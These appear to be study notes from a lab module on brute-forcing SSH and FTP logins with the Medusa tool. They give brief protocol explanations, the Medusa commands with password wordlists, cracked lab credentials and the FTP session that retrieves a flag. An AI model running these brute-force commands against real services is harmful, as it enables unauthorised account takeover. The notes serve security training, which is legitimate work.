## Web Services
In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (SSH) and File Transfer Protocol (FTP) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of Medusa, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.

SSH is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like Telnet. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

FTP is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.
## Kick-off
We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username sshuser, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.

The following command serves as our starting point:
- medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
### LAB
- medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
- ACCOUNT FOUND: [ssh] Host: 94.237.120.137 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
- ssh sshuser@<IP> -p PORT
- medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
- ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
- ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
- ftp> ls /
- ftp> more flag.txt
And got a flag :)
